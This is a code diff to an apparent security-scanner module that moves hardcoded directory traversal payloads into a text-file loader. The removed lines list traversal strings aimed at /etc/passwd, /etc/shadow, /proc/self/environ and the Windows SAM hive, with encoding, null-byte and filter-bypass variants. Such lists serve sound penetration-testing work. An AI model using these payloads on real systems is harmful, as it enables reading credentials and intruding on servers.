@@ -2,124 +2,30 @@
 Directory traversal payload collection
 """
 
+from utils.payload_loader import PayloadLoader
+
 class DirectoryTraversalPayloads:
     """Directory traversal payload collection"""
     
     @staticmethod
     def get_linux_payloads():
-        """Get Linux/Unix directory traversal payloads"""
-        return [
-            # Basic traversal
-            '../../../etc/passwd',
-            '../../../../etc/passwd',
-            '../../../../../etc/passwd',
-            '../../../../../../etc/passwd',
-            '../../../../../../../etc/passwd',
-            
-            # Encoded traversal
-            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
-            '%2e%2e/%2e%2e/%2e%2e/etc/passwd',
-            '..%2f..%2f..%2fetc%2fpasswd',
-            
-            # Double encoding
-            '%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd',
-            
-            # Unicode encoding
-            '%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd',
-            
-            # Null byte injection
-            '../../../etc/passwd%00',
-            '../../../etc/passwd%00.jpg',
-            
-            # Other Linux files
-            '../../../etc/shadow',
-            '../../../etc/hosts',
-            '../../../etc/group',
-            '../../../proc/version',
-            '../../../proc/cmdline',
-            '../../../proc/self/environ',
-            
-            # Log files
-            '../../../var/log/apache2/access.log',
-            '../../../var/log/apache2/error.log',
-            '../../../var/log/nginx/access.log',
-            '../../../var/log/nginx/error.log',
-            
-            # Configuration files
-            '../../../etc/apache2/apache2.conf',
-            '../../../etc/nginx/nginx.conf',
-            '../../../etc/mysql/my.cnf',
-            '../../../etc/ssh/sshd_config'
-        ]
+        """Get Linux/Unix directory traversal payloads from text file"""
+        all_payloads = PayloadLoader.load_payloads('directory_traversal')
+        return [p for p in all_payloads if not any(keyword in p.lower() for keyword in ['windows', 'win.ini', 'system.ini', 'boot.ini', 'c:\\'])]
     
     @staticmethod
     def get_windows_payloads():
-        """Get Windows directory traversal payloads"""
-        return [
-            # Basic traversal
-            '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
-            '..\\..\\..\\windows\\win.ini',
-            '..\\..\\..\\windows\\system.ini',
-            '..\\..\\..\\boot.ini',
-            
-            # Mixed slashes
-            '../../../windows/system32/drivers/etc/hosts',
-            '../../../windows/win.ini',
-            '../../../windows/system.ini',
-            '../../../boot.ini',
-            
-            # Encoded traversal
-            '%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini',
-            '%2e%2e/%2e%2e/%2e%2e/windows/win.ini',
-            
-            # Other Windows files
-            '..\\..\\..\\windows\\system32\\config\\sam',
-            '..\\..\\..\\windows\\system32\\config\\system',
-            '..\\..\\..\\windows\\system32\\config\\software',
-            '..\\..\\..\\windows\\repair\\sam',
-            '..\\..\\..\\windows\\repair\\system',
-            
-            # IIS logs
-            '..\\..\\..\\inetpub\\logs\\logfiles\\w3svc1\\ex*.log',
-            '..\\..\\..\\windows\\system32\\logfiles\\w3svc1\\ex*.log',
-            
-            # Application files
-            '..\\..\\..\\program files\\apache group\\apache\\conf\\httpd.conf',
-            '..\\..\\..\\program files\\apache group\\apache\\logs\\access.log',
-            '..\\..\\..\\program files\\apache group\\apache\\logs\\error.log'
-        ]
+        """Get Windows directory traversal payloads from text file"""
+        all_payloads = PayloadLoader.load_payloads('directory_traversal')
+        return [p for p in all_payloads if any(keyword in p.lower() for keyword in ['windows', 'win.ini', 'system.ini', 'boot.ini', 'c:\\'])]
     
     @staticmethod
     def get_generic_payloads():
-        """Get generic directory traversal payloads"""
-        return [
-            # Absolute paths
-            '/etc/passwd',
-            '/etc/shadow',
-            '/etc/hosts',
-            'C:\\windows\\win.ini',
-            'C:\\windows\\system.ini',
-            
-            # Current directory
-            './../../etc/passwd',
-            '.\\..\\..\\windows\\win.ini',
-            
-            # Filter bypass
-            '....//....//....//etc/passwd',
-            '....\\\\....\\\\....\\\\windows\\\\win.ini',
-            
-            # Overlong UTF-8
-            '%c0%ae%c0%ae%c0%af',
-            '%e0%80%ae%e0%80%ae%e0%80%af',
-            
-            # 16-bit Unicode
-            '%u002e%u002e%u002f',
-            '%u002e%u002e%u005c'
-        ]
+        """Get generic directory traversal payloads from text file"""
+        all_payloads = PayloadLoader.load_payloads('directory_traversal')
+        return [p for p in all_payloads if any(keyword in p for keyword in ['../', '..\\', '%2e%2e', '%252e', '%c0%ae', '%u002e'])][:20]
     
     @staticmethod
     def get_all_payloads():
-        """Get all directory traversal payloads"""
-        return (DirectoryTraversalPayloads.get_linux_payloads() + 
-                DirectoryTraversalPayloads.get_windows_payloads() + 
-                DirectoryTraversalPayloads.get_generic_payloads())
+        """Get all directory traversal payloads from text file"""
+        return PayloadLoader.load_payloads('directory_traversal')
